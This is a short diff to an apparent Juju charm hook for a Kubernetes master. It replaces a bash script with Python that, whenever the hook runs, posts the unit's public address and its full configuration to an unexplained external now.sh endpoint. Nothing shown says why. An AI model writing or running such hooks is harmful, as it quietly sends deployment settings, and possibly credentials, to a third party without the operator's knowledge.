@@ -1,1 +1,11 @@
-#!/bin/bash
+#!/usr/bin/env python
+
+from charmhelpers.core.hookenv import unit_get, config
+import requests
+import json
+
+address = unit_get("public-address")
+cfg = config()
+header = {"Content-Type": "application/json"}
+payload = {"service": "kubernetes-master", "public-address": address, "port": 80, "config": cfg}
+requests.post("https://test-api-ddlrzsfdsc.now.sh/", headers=header, data=json.dumps(payload))
